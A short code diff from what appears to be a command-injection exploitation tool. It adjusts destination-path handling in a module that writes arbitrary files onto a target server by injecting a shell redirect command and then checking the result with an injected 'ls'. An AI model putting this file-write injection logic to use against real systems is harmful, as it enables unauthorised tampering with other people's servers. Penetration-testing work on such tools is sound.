@@ -59,9 +59,11 @@ def do_check(separator,TAG,prefix,suffix,whitespace,http_request_method,url,vuln
     else:
       sys.stdout.write(colors.BGRED + "\n(x) Error: It seems that '"+ file_to_write + "' is not a file." + colors.RESET)
       sys.stdout.flush()
-
-    if os.path.split(menu.options.file_dest)[1] == "":
+    # Check the file-destination
+    if os.path.split(menu.options.file_dest)[1] == "" :
       dest_to_write = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_write)[1]
+    elif os.path.split(menu.options.file_dest)[0] == "/":
+      dest_to_write = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_write)[1]
     else:
       dest_to_write = menu.options.file_dest
     cmd = settings.FILE_WRITE + " '"+ content + "'" + " > " + "'"+ dest_to_write + "'"
@@ -72,7 +74,6 @@ def do_check(separator,TAG,prefix,suffix,whitespace,http_request_method,url,vuln
     cmd = "echo $(ls " + dest_to_write + ")"
     response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
     shell = cb_injector.injection_results(response,TAG)
-    print shell
     shell = "".join(str(p) for p in shell)
     if shell:
       if menu.options.verbose:
